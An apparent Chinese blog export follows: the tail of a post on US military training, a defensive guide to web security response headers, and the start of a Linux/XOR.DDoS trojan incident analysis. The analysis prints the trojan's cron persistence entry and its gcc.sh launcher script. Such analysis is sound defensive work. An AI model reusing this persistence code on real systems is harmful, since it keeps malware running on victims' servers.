<p>统一教学标准：《现代军事格斗训练大纲》，兼收并蓄，沉淀改进。<br>统一教官标准：按纲施训，不求个体最优，但求总体提升。<br>分级竞赛：技术上从初级到高级逐步提高难度，课程体系上区分不同作战单位，可以看得出非常重视提高学员组织训练能力。<br>促进交流：每年轮训的学员来自全球各个基地，不断的比赛切磋，可以激励日常训练，不但提高了教官群体的整体水平，而且从中脱颖而出的人，又可以作为高级教官的种子。<br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Education-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-2.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-3.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-4.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-5.png" alt></p>
<h2 id="关于美军中的各种学校"><a href="#关于美军中的各种学校" class="headerlink" title="关于美军中的各种学校"></a>关于美军中的各种学校</h2><p>美军有数不清的各种学校，此处不展开，节选一段美海军的实录供参考。</p>
<blockquote>
<p>候任舰长必须参加一项为期8个月的培训，在多所学校连续进行长时间的“流水线训练”。<br>－－－－《驱逐舰舰长》（［美］詹姆斯－斯塔夫里迪斯）<br>不是确定每位候任舰长需要接受哪些训练，再为每一位军官提供精确指导的训练，而是基于一条知识基准线。</p>
</blockquote>
<p>这些知识是每名舰长在过去的工作中都曾接触过的，把每个人送去将所有这些知识再重复学一遍。</p>
<p>毫无疑问，这是一种保守、效率最低的方法。没完没了的讲课，讲的都是你已经非常熟悉、至少已经消化理解的知识。从长远看，这种训练也有其好处。</p>
<p>作者在这段时间的日记中也提到了各种学校。例如：</p>
<blockquote>
<p>“战斧”导弹学校，专门培训该型武器的所有细节；<br>工程技术培训学校，装备有舰船工程车间的实体模型及各种管线；<br>“候任舰长”学校，纽波特，6周内集中学习舰艇操纵、国际法、安全、通信等；<br>“宙斯盾”学校，一个月，佛吉尼亚州的达尔格伦；<br>海军战术训练学校，佛吉尼亚海滩，丹姆内克训练场，不久前任职舰长，经验丰富的资深军官担任教官；</p>
</blockquote>
<h2 id="军民关系"><a href="#军民关系" class="headerlink" title="军民关系"></a>军民关系</h2><p>作为一支没有政委的志愿兵军队，美帝也是很懂得政治工作的。<br>美图：游骑兵竞赛日。邀请家属来队观战。感觉都High翻了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-10.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-11.png" alt></p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul>
<li>纪录片《战斗力Combat Forces》</li>
<li>《驱逐舰舰长》（［美］詹姆斯－斯塔夫里迪斯）</li>
<li>《我在美军航母上的8年》</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.thebalancecareers.com/u-s-army-physical-fitness-requirements-4055631" target="_blank" rel="noopener">U.S. Army Physical Fitness Requirements | Physical Fitness Charts for Males Age 27-31</a></li>
<li><a href="https://en.wikipedia.org/wiki/Physical_Fitness_Badge" target="_blank" rel="noopener">Physical Fitness Badge | 荣誉</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:Web应用安全：攻击、防护与检测</title>
    <url>/2017/08/31/CyberSecurity-Headers/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Web 应用服务器安全：攻击、防护与检测</li>
</ul>
<span id="more"></span>
<h2 id="Web-应用服务器安全：攻击、防护与检测"><a href="#Web-应用服务器安全：攻击、防护与检测" class="headerlink" title="Web 应用服务器安全：攻击、防护与检测"></a>Web 应用服务器安全：攻击、防护与检测</h2><h4 id="摘要-1"><a href="#摘要-1" class="headerlink" title="摘要"></a>摘要</h4><p>目前有许多的恶意攻击都是以网站及其用户作为目标，本文将简要介绍在 Web 服务器一侧的安全加固和测试方法。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>攻击方式</th>
<th>防护方式</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>点击劫持(clickjacking)</td>
<td>X-Frame-Options Header</td>
<td>——-</td>
</tr>
<tr>
<td>基于 SSL 的中间人攻击(SSL Man-in-the-middle)</td>
<td>HTTP Strict Transport Security</td>
<td>——-</td>
</tr>
<tr>
<td>跨站脚本(Cross-site scripting,XSS)</td>
<td>X-XSS-Protection、Content-Security-Policy、X-Content-Type-Options</td>
<td>——-</td>
</tr>
</tbody>
</table>
</div>
<h4 id="点击劫持（Clickjacking）"><a href="#点击劫持（Clickjacking）" class="headerlink" title="点击劫持（Clickjacking）"></a>点击劫持（Clickjacking）</h4><p>点击劫持,<a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/">clickjacking</a> 是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段，又被称为界面伪装（UI redressing）。例如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是被诱骗进入一个购物网站。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CyberSecurity_Clickjack.png" alt=""></p>
<p>针对点击劫持攻击，<a href="https://www.owasp.org">开放Web应用程序安全项目(Open Web Application Security Project ,OWASP)</a>(非营利组织，其目的是协助个人、企业和机构来发现和使用可信赖软件) 提供了一份指引，<a href="https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet#Defending_with_X-Frame-Options_Response_Headers">《Defending_with_X-Frame-Options_Response_Headers》</a> 。</p>
<p>X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在 frame 标签 或者 object 标签中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 (clickjacking) 的攻击。DENY:表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。SAMEORIGIN:表示该页面可以在相同域名页面的 frame 中展示。ALLOW-FROM uri:表示该页面可以在指定来源的 frame 中展示。配置如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy</span></span><br><span class="line">http-response set-header X-Frame-Options:DENY</span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header X-Frame-Options <span class="string">&quot;DENY&quot;</span>;</span><br><span class="line"><span class="comment">//Java</span></span><br><span class="line">response.addHeader(<span class="string">&quot;x-frame-options&quot;</span>,<span class="string">&quot;DENY&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="跨站脚本-Cross-site-scripting-XSS"><a href="#跨站脚本-Cross-site-scripting-XSS" class="headerlink" title="跨站脚本 Cross-site scripting (XSS)"></a>跨站脚本 Cross-site scripting (XSS)</h3><p>跨站脚本通常指的是通过利用开发时留下的漏洞，注入恶意指令代码（JavaScript/Java/VBScript/ActiveX/Flash/HTML等）到网页，使用户加载并执行攻击者恶意制造的程序。攻击者可能得到更高的权限、私密网页、会话和cookie等各种内容。目前有两种不同的 HTTP 响应头可以用来防止 XSS 攻击，它们是：</p>
<ul>
<li>X-XSS-Protection</li>
<li>Content-Security-Policy</li>
</ul>
<h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>HTTP X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。配置选项：0 禁止XSS过滤。1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。mode=block 启用XSS过滤, 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。report=reporting-URI 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。参考文章<a href="http://blog.innerht.ml/the-misunderstood-x-xss-protection/">《The misunderstood X-XSS-Protection》</a>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy</span></span><br><span class="line">http-response set-header X-XSS-Protection: <span class="number">1</span>;mode=block</span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header X-Xss-Protection <span class="string">&quot;1; mode=block&quot;</span> always;;</span><br></pre></td></tr></table></figure>
<p>浏览器支持情况：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Chrome</th>
<th>Edge</th>
<th>Firefox</th>
<th>Internet Explorer</th>
<th>Opera</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>(Yes)</td>
<td>(Yes)</td>
<td>No</td>
<td>8.0</td>
<td>(Yes)</td>
<td>(Yes)</td>
</tr>
</tbody>
</table>
</div>
<h4 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h4><p>内容安全性政策(Content Security Policy,CSP)就是一种白名单制度，明确告诉客户端哪些外部资源（脚本／图片／音视频等）可以加载和执行。浏览器可以拒绝任何不来自预定义位置的任何内容，从而防止外部注入的脚本和其他此类恶意内容。设置 Content-Security-Policy Header：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy:</span></span><br><span class="line">http-response set-header Content-Security-Policy:script-src https:<span class="comment">//www.google-analytics.com;https://q.quora.com</span></span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header Content-Security-Policy-Report-Only <span class="string">&quot;script-src https://www.google-analytics.com https://q.quora.com&quot;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="MIME-Sniffing"><a href="#MIME-Sniffing" class="headerlink" title="MIME-Sniffing"></a>MIME-Sniffing</h4><p>MIME-Sniffing（主要是Internet Explorer）使用的一种技术，它尝试猜测资源的 MIME 类型（也称为 Content-Type 内容类型）。这意味着浏览器可以忽略由 Web 服务器发送的 Content-Type Header，而不是尝试分析资源（例如将纯文本标记为HTML 标签），按照它认为的资源（HTML）渲染资源而不是服务器的定义（文本）。虽然这是一个非常有用的功能，能够纠正服务器发送的错误的 Content-Type，但是心怀不轨的人可以轻易滥用这一特性，这使得浏览器和用户可能被恶意攻击。例如，如通过精心制作一个图像文件，并在其中嵌入可以被浏览器所展示和执行的HTML和t代码。<a href="https://blogs.msdn.microsoft.com/ie/2008/07/02/ie8-security-part-v-comprehensive-protection/">《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》</a>：</p>
<blockquote>
<p>Consider, for instance, the case of a picture-sharing web service which hosts pictures uploaded by anonymous users. An attacker could upload a specially crafted JPEG file that contained script content, and then send a link to the file to unsuspecting victims. When the victims visited the server, the malicious file would be downloaded, the script would be detected, and it would run in the context of the picture-sharing site. This script could then steal the victim’s cookies, generate a phony page, etc.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy</span></span><br><span class="line">http-response set-header X-Content-Type-Options: nosniff</span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header X-Content-Type-Options <span class="string">&quot;nosniff&quot;</span> always;</span><br></pre></td></tr></table></figure>
<h4 id="SSL-Strip-Man-in-The-Middle-Attack"><a href="#SSL-Strip-Man-in-The-Middle-Attack" class="headerlink" title="SSL Strip Man-in-The-Middle Attack"></a>SSL Strip Man-in-The-Middle Attack</h4><p>中间人攻击中攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络。强制用户使用<a href="#">HTTP严格传输安全（HTTP Strict Transport Security,HSTS）</a>。 HSTS 是一套由 <a href="https://riboseyim.github.io/2017/05/12/Protocol-RFC/">IETF</a> 发布的互联网安全策略机制。Chrome 和 Firefox 浏览器有一个内置的 HSTS 的主机列表，网站可以选择使用 HSTS 策略强制浏览器使用 HTTPS 协议与网站进行通信，以减少会话劫持风险。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CyberSecurity_sslstrip-mitm.png" alt=""></p>
<p>服务器设置下列选项可以强制所有客户端只能通过 HTTPS 连接：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy</span></span><br><span class="line">http-response set-header Strict-Transport-Security max-age=<span class="number">31536000</span>;includeSubDomains;preload</span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header Strict-Transport-Security <span class="string">&#x27;max-age=31536000; includeSubDomains; preload; always;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="暴露-URL-（HTTPS-gt-HTTP-Sites"><a href="#暴露-URL-（HTTPS-gt-HTTP-Sites" class="headerlink" title="暴露 URL （HTTPS &gt; HTTP Sites)"></a>暴露 URL （HTTPS &gt; HTTP Sites)</h4><p>Referrer 信息被广泛用于网络访问流量来源分析，它是众多网站数据统计服务的基础，例如 <a href="#">Google Analytics</a> 和 <a href="https://awstats.sourceforge.io/">AWStats,基于Perl的开源日志分析工具</a>。同样的这一特性也会很容易被恶意利用，造成用户敏感信息泄漏，例如将用户 SESSION ID 放在 URL 中，第三方拿到就可能看到别人登录后的页面内容。2014 年，W3C 发布了 Referrer Policy 的新草案，开发者开始有权控制自己网站的 Referrer Policy。但是仅有 Chrome／Firefox 浏览器较新的版本的能够提供支持。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Feature</th>
<th>Chrome</th>
<th>Firefox</th>
<th>Edge、Internet Explorer、    Opera、Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>Basic Support</td>
<td>56.0</td>
<td>50.0</td>
<td>(No)</td>
</tr>
<tr>
<td>same-origin</td>
<td>(No)1</td>
<td>52.0</td>
<td>(No)</td>
</tr>
<tr>
<td>strict-origin</td>
<td>(No)1</td>
<td>52.0</td>
<td>(No)</td>
</tr>
<tr>
<td>strict-origin-when-cross-origin</td>
<td>(No)1</td>
<td>52.0</td>
<td>(No)</td>
</tr>
</tbody>
</table>
</div>
<p>Referrer-Policy选项列表：</p>
<ul>
<li>Referrer-Policy: no-referrer  //整个 Referer 首部会被移除。访问来源信息不随着请求一起发送。</li>
<li>Referrer-Policy: no-referrer-when-downgrade //默认选项<br>//引用页面的地址会被发送(HTTPS-&gt;HTTPS)，降级的情况不会被发送 (HTTPS-&gt;HTTP)</li>
<li>Referrer-Policy: origin //在任何情况下，仅发送文件的源作为引用地址</li>
<li>Referrer-Policy: origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址，但是对于非同源请求仅发送文件的源</li>
<li>Referrer-Policy: same-origin //对于同源的请求会发送引用地址，但是对于非同源请求则不发送引用地址信息。</li>
<li>Referrer-Policy: strict-origin //在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS-&gt;HTTPS)</li>
<li>Referrer-Policy: strict-origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址</li>
<li>Referrer-Policy: unsafe-url //无论是否同源请求，都发送完整的 URL（移除参数信息之后）作为引用地址。</li>
</ul>
<p>我们必须确保用户从全 HTTPS 站点跳转到 HTTP 站点的时候，没有中间人可以嗅探出用户实际的 HTTPS URL，Referrer Policy 设置如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HAProxy</span></span><br><span class="line">http-response set-header Referrer-Policy no-referrer-when-downgrade</span><br><span class="line"><span class="comment">//Nginx</span></span><br><span class="line">add_header Referrer-Policy: no-referrer-when-downgrade</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>Source</th>
<th>Destination</th>
<th>Referrer （Policy :no-referrer-when-downgrade）</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://test.com/blog1/">https://test.com/blog1/</a></td>
<td><a href="http://test.com/blog2/">http://test.com/blog2/</a></td>
<td>NULL</td>
</tr>
<tr>
<td><a href="https://test.com/blog1/">https://test.com/blog1/</a></td>
<td><a href="https://test.com/blog2/">https://test.com/blog2/</a></td>
<td><a href="https://test.com/blog1/">https://test.com/blog1/</a></td>
</tr>
<tr>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
<td><a href="http://test.com/blog2/">http://test.com/blog2/</a></td>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
</tr>
<tr>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
<td><a href="http://example.com">http://example.com</a></td>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
</tr>
<tr>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
<td><a href="https://example.com">https://example.com</a></td>
<td><a href="http://test.com/blog1/">http://test.com/blog1/</a></td>
</tr>
<tr>
<td><a href="https://test.com/blog1/">https://test.com/blog1/</a></td>
<td><a href="http://example.com">http://example.com</a></td>
<td>NULL</td>
</tr>
</tbody>
</table>
</div>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>安全研究员 Scott Helme 贡献了一个非常棒的网站 [<a href="https://securityheaders.io/]，可以分析自己站点的Header(报文头)，并提出改进安全性的建议。示例如下（环境参数，Operating">https://securityheaders.io/]，可以分析自己站点的Header(报文头)，并提出改进安全性的建议。示例如下（环境参数，Operating</a> System: CentOS 7 ; haproxy 1.5.14 ; nginx 1.12.0）。</p>
<ul>
<li>加固前的检测结果<br><img src="http://riboseyim-qiniu.riboseyim.com/CyberSecuryty_Web_Headers_1.png" alt="加固前"></li>
<li>加固后的检测结果<br><img src="http://riboseyim-qiniu.riboseyim.com/CyberSecuryty_Web_Headers_2.png" alt="加固后"></li>
</ul>
<h2 id="扩展阅读：《The-Cyber-Security-Master》"><a href="#扩展阅读：《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读：《The Cyber-Security Master》"></a>扩展阅读：<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.twilio.com/blog/a-http-headers-for-the-responsible-developer">HTTP headers for the responsible developer</a></li>
<li><a href="https://www.sans.org/reading-room/whitepapers/threats/ssl-man-in-the-middle-attacks-480">SSL Man-in-the-Middle Attacks|SANS Institute InfoSec Reading Room</a></li>
<li><a href="https://scotthelme.co.uk/a-new-security-header-referrer-policy/">A new security header: Referrer Policy | Scott Helme</a></li>
<li><a href="https://blogs.msdn.microsoft.com/ie/2008/07/02/ie8-security-part-v-comprehensive-protection/">《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》</a></li>
<li><a href="https://scotthelme.co.uk/wifi-pineapple-karma-sslstrip/">The WiFi Pineapple - Using Karma and SSLstrip to MiTM secure connections | Scott Helme</a></li>
<li><a href="https://scotthelme.co.uk/content-security-policy-an-introduction/">Content Security Policy - An Introduction | Scott Helme</a></li>
<li><a href="https://yq.aliyun.com/articles/61144">Content Security Policy 入门教程 | 云栖社区</a></li>
<li><a href="https://imququ.com/post/referrer-policy.html">Referrer Policy 介绍 | Jerry Qu</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>木马来袭:Linux/XOR.DDoS样本分析</title>
    <url>/2016/06/12/CyberSecurity-Trojan/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Linux/XOR.DDoS 木马入侵分析</li>
</ul>
<span id="more"></span>
<blockquote>
<p>在与特洛伊的战争中，我们从未取得优势。— 弗拉基米.耶维奇.严</p>
</blockquote>
<h2 id="Linux-XOR-DDoS-木马入侵分析"><a href="#Linux-XOR-DDoS-木马入侵分析" class="headerlink" title="Linux/XOR.DDoS 木马入侵分析"></a>Linux/XOR.DDoS 木马入侵分析</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/trojan-demo-1.png" alt="样本"></p>
<p>第一节：编号101</p>
<p>第二节：今天你被挖矿了吗？</p>
<h5 id="工程师的三大法宝"><a href="#工程师的三大法宝" class="headerlink" title="工程师的三大法宝"></a>工程师的三大法宝</h5><p>一个有江湖经验的工程师，通常随身携带三件法宝，就像这样：</p>
<blockquote>
<p>用户：这个采集点为什么没数据？<br>客服：我们看看<br>工程师各种排查，重启进程<br>客服：现在有了，你再看看？<br>用户：……<br>三天后<br>用户：这个采集点为什么又没数据？<br>工程师各种排查，发现A机房的某台服务器登陆缓慢<br>客服：一台服务器坏了，需要重装系统<br>用户：……<br>系统重装几周后，问题再次来袭<br>工程师：服务器太老了，硬件有问题，建议换新的<br>用户：……</p>
</blockquote>
<p><strong>“没有什么问题是重启解决不了的，如果一次不行，那就两次。”</strong></p>
<p>在很多情况下，三板斧确实可以解决不少问题。</p>
<p>重启：<br>包括进程重启和系统重启，鉴于很多程序自身的隐藏性能问题，重启可以释放资源、重新加载配置，或者可能输出异常信息，为解决问题提供思路。<br>重装：修复被破坏的文件，格式化磁盘，修复配置等。有一定效果。<br>换机器：对于有年头的机器有效，磁盘、CPU、主板、乃至于不起眼的一颗电池，都有可能是引发性能问题的瓶颈。</p>
<p>如果排除上述因素，就要警惕自己的机器是不是被植入木马了。我们首先来看一个样本。</p>
<h4 id="特征分析"><a href="#特征分析" class="headerlink" title="特征分析"></a>特征分析</h4><p>一般特征：功能异常数上升、登陆缓慢、网卡流量异常波动<br>如果木马程序还没有进程隐藏功能的话，还可以在top看到如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND</span><br><span class="line">3494 root      19   0  378m  25m  212 R **1595.6**  0.7   5798:34 eyshcjdmzg</span><br></pre></td></tr></table></figure>
<p>这是我抓到的第一个木马样本，所以给它取了个代号：101。</p>
<h3 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h3><ol>
<li>篡改crontab</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line">HOME=/</span><br><span class="line"></span><br><span class="line">\# run-parts</span><br><span class="line">01 * * * * root run-parts /etc/cron.hourly</span><br><span class="line">02 4 * * * root run-parts /etc/cron.daily</span><br><span class="line">22 4 * * 0 root run-parts /etc/cron.weekly</span><br><span class="line">42 4 1 * * root run-parts /etc/cron.monthly</span><br><span class="line">\*/3 * * * * root /etc/cron.hourly/gcc.sh</span><br></pre></td></tr></table></figure>
<ol>
<li>程序入口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># vi /etc/cron.hourly/gcc.sh</span><br><span class="line">\#!/bin/sh</span><br><span class="line">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin</span><br><span class="line">for i in `cat /proc/net/dev|grep :|awk -F: &#123;&#x27;print $1&#x27;&#125;`; do ifconfig $i up&amp; done   </span><br><span class="line">cp /lib/libudev.so /lib/libudev.so.6</span><br><span class="line">/lib/libudev.so.6</span><br></pre></td></tr></table></figure>
<p>木马通过crontab创建时间计划任务来实现启动,运行该gcc.sh，该命令启动所有网卡，并拷贝/lib/libudev.so文件到/lib/libudev.so.6并执行该文件。</p>
<ol>
<li><p>攻击路径<br>如果部署了登陆审计平台，或者对方还没来得及清扫犯罪现场，可以看到他的来路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash-4.3# last -10</span><br><span class="line">user   pts/3        11X.25.49.200    Mon Jun  6 23:46 - 01:47  (02:01)</span><br></pre></td></tr></table></figure>
<p>再根据以上公网IP和时间，可以定位到它的来源是某普通宽带用户。<br>宽带账号：05919399XXXX@fj<br>客户名称：危XX</p>
</li>
<li><p>应急清除策略<br>恢复crontab－&gt;清除gcc.sh －&gt;清除/lib/libudev.so.6 －&gt;查杀进程<br>一定要注意操作顺序，如果只kill掉进程是没有用的，它已经做到自己复制、重启。</p>
</li>
</ol>
<h4 id="XOR-DDoS木马原理"><a href="#XOR-DDoS木马原理" class="headerlink" title="XOR.DDoS木马原理"></a>XOR.DDoS木马原理</h4><p>编号101是一款国产的Linux系统的远程控制软件（Linux/XOR.DDoS）。</p>
<p>MalwareMustDie首先在2014年10月曝光了该木马。32位和64位的Linux Web服务器、台式机、ARM架构系统等也容易遭受该木马攻击。</p>
